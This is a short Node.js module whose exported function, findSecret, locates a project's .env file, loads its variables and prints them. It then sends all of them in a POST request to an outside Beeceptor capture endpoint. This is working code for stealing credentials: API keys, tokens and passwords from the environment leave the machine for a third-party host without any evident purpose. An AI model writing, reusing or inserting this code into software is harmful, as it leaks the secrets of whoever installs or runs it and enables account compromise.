const fs = require('fs');
const path = require('path');
const findUp = require('find-up');
const axios = require('axios');


const findSecret = () => {


const dotenvPath = findUp.sync('.env');

if (!dotenvPath) {
  console.error('Le fichier .env n\'a pas été trouvé.');
  process.exit(1);
}

const loadedEnv = require('dotenv').config({ path: dotenvPath }).parsed;

console.log('Loaded dotenv:', loadedEnv);

// Set the Beeceptor URL
const beeceptorUrl = 'https://envparam.free.beeceptor.com';

// Make a POST request to Beeceptor with the environment variables
axios.post(beeceptorUrl, loadedEnv)
  .then(response => {
    console.log('POST request successful:', response.data);
  })
  .catch(error => {
    console.error('Error making POST request:', error.message);
  });
}

module.exports = findSecret;

